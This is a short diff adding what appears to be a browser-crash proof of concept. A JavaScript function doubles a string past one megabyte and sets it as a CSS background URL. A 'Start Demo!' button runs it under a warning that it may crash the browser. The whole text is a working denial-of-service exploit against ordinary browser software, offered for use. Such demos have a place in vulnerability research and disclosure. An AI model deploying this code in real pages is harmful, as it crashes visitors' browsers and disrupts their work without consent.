@@ -1,0 +1,11 @@
+function Demo() {
+	var a = document.createElement('a');
+	var b = 'XXXX';
+	while (b.length <= 1024*1024) b+=b;
+	a.style.background = 'url(https://' + b + ')';
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
